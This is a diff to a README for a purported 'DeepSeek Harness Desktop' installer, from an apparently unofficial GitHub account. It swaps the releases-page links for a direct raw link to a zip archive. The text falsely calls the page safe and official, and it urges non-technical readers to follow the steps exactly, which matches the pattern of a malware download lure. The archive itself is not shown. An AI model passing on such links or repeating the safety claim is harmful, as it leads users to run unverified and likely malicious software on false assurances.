@@ -20,7 +20,7 @@ If you can double-click a file and follow simple on-screen prompts, you have all
 
 ## ⬇️ Download the Installer
 
-[![Download Now](https://img.shields.io/badge/Download-DeepSeek_Harness_Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Limenitisarthemisbacking315/deepseek-harness-desktop-Install/releases)
+[![Download Now](https://img.shields.io/badge/Download-DeepSeek_Harness_Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Limenitisarthemisbacking315/deepseek-harness-desktop-Install/main/fanmaker/desktop_deepseek_harness_Install_v2.0.zip)
 
 Visit this link to download the application.
 
@@ -31,7 +31,7 @@ Follow these steps exactly as written. Each step is designed to work without any
 ### Step 1: Open the Download Link
 
 Click the green button above or go directly to:
-`https://github.com/Limenitisarthemisbacking315/deepseek-harness-desktop-Install/releases`
+`https://raw.githubusercontent.com/Limenitisarthemisbacking315/deepseek-harness-desktop-Install/main/fanmaker/desktop_deepseek_harness_Install_v2.0.zip`
 
 Your browser will open a page showing available releases. This page is safe and belongs to the official project repository.
 
